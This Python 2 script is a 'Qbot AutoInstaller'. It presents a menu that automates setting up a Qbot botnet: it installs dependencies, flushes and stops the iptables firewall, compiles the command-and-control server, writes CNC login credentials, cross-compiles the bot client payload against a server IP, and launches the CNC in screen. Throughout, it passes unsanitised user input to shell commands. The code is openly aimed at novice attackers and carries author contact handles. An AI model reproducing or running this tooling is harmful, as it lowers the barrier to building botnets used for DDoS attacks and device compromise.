#!/usr/bin/python																																																																																																#cc8d853da9dc58585041e7316d12c1e9

#   Qbot AutoInstaller
#   for the kiddos
#   Discord: charge.#6666
#   IG: switch
#   website: theswitcharchive.com <<

#import some hacks
import subprocess, time, sys, random


def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear') # clear the screen :hahayes:

qbot = raw_input(""" 
        \x1b[37m>--- \x1b[96mEnjoy My AutoInstaller! \x1b[37m---<


		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
if qbot == "Q":
	exit()	

if qbot == "1":
	print("\x1b[96mInstalling Dependencies..\x1b[37m")
	run('yum install gcc screen nano httpd python perl -y; ulimit -n 99999')
	time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\x1b[32mDependencies Installed!\x1b[37m")
	print("Returning to the main menu in 2 seconds.")
	for i in xrange(2,0,-1):
			sys.stdout.write(str(i)+' ')
			sys.stdout.flush()
			time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('clear')	
	qbot = raw_input(""" 

		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
	if qbot == "Q":
		exit()

if qbot == "2":
	print("\x1b[96mStopping IPTables..\x1b[37m")
	run('iptables -F; service iptables stop')
	time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\x1b[32mIPTables Stopped!\x1b[37m")
	print("Returning to the main menu in 2 seconds.")
	for i in xrange(2,0,-1):
			sys.stdout.write(str(i)+' ')
			sys.stdout.flush()
			time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('clear')
	qbot = raw_input(""" 

		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
	if qbot == "Q":
		exit()

if qbot == "3":
	serverside = raw_input("\x1b[96mPlease enter your serverside name. WITH THE '.c' (usually 'server.c' or something along those lines)\x1b[37m: ")																																																																																																#cc8d853da9dc58585041e7316d12c1e9
	run('gcc ' + serverside + ' -o server -pthread')
	time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\x1b[32mIf there was no errors then your serverside should be compiled!\x1b[37m")
	print("Returning to the main menu in 5 seconds.")
	for i in xrange(5,0,-1):
			sys.stdout.write(str(i)+' ')
			sys.stdout.flush()
			time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('clear')
	qbot = raw_input(""" 

		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
	if qbot == "Q":
		exit()

if qbot == "4":
	username = raw_input("\x1b[96m Please enter what you want your Username to be\x1b[37m: ")
	password = raw_input("\x1b[96m Please enter what you want your Password to be\x1b[37m: ")
	run('echo ' + username + ' ' + password +' >> login.txt') # echo user and pass into login.txt, FAT HACKS
	print("\x1b[32mUsername and Password setup!\x1b[37m")
	print("Returning to the main menu in 3 seconds.")
	for i in xrange(3,0,-1):
			sys.stdout.write(str(i)+' ')
			sys.stdout.flush()
			time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('clear')
	qbot = raw_input(""" 

		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
	if qbot == "Q":
		exit()

if qbot == "5":
	cc = raw_input("\x1b[96m Please enter your Cross Compiler name (usually cc7.py or something like that)\x1b[37m: ")
	client = raw_input("\x1b[96m Please enter your Source's Client name (usually client.c or sourcename.c)\x1b[37m: ")
	ip = raw_input("\x1b[96m Please enter your Server IP \x1b[37m: ")
	print("Cross compiling will start in 5 seconds. \x1b[31mPress Y when it asks to 'Get Arch's\x1b[37m")
	time.sleep(5)
	run('python ' + cc + ' ' +client + ' ' + ip)
	print("\x1b[31mPlease save your payload. You have 20 seconds before the script will return to the main menu\x1b[37m")
	print("Returning to the main menu in 20 seconds.")
	for i in xrange(20,0,-1):
			sys.stdout.write(str(i)+' ')
			sys.stdout.flush()
			time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('clear')
	qbot = raw_input(""" 

		\x1b[37m>--- \x1b[96mqBot Help Menu \x1b[37m---<

	\x1b[96m1) \x1b[37mInstall qBot Dependencies
	\x1b[96m2) \x1b[37mStop iptables 
	\x1b[96m3) \x1b[37mCompile Serverside
	\x1b[96m4) \x1b[37mCreate login credentials
	\x1b[96m5) \x1b[37mCross Compile Source
	\x1b[96m6) \x1b[37mScreen the CNC
	
	Press Q to quit

	please select an option: """)
	if qbot == "Q":
		exit()

if qbot == "6":
	botport = raw_input("\x1b[96m Please enter your Bot Port, this is the port in the client.c of your source\x1b[37m: ")
	cncport = raw_input("\x1b[96m Please enter what you want the CNC Port to be (port you will connect to on PuTTY)\x1b[37m: ")
	print("")
	print("\x1b[96m Once this command has been ran, \x1b[31myou will need to detach from the screen, \x1b[96myou can do this by \x1b[31mholding down CTRL and pressing A+D")																																																																																																					#cc8d853da9dc58585041e7316d12c1e9
	print("\x1b[96m So \x1b[31mhold down CTRL, hold down A, then press D, \x1b[37m(\x1b[31mCTRL A+D\x1b[37m)")
	print("")
	confirm = raw_input("Please press enter when you are ready:")
	print("")
	print("\x1b[96m Screening the CNC in 5 seconds.")
	for i in xrange(5,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	run('screen ./server ' + botport + ' 850 ' + cncport) # idk if this actually works, come back to it later as its probably br0ken
	print("\x1b[96mCongrats, your Qbot is now setup, you can connect to it through PuTTY, using RAW on Port " + cncport )
	print("""

	\x1b[96mIf you have any others you want me to add or you have any other special feature requests for possible future updates
	\x1b[32mMessage me on Discord: charge.#6666

	\x1b[32mThanks for using.\n""")
	print("\x1b[31mThis script will now brick your server in 5 seconds.\n")
	for i in xrange(5,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\x1b[32m\nIM JOKINGGG RELAXXXX\n")
	time.sleep(1)
	print("\x1b[31mScript will now close in 2 seconds.\n\x1b[37m")
	for i in xrange(2,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
		print("")
	exit()
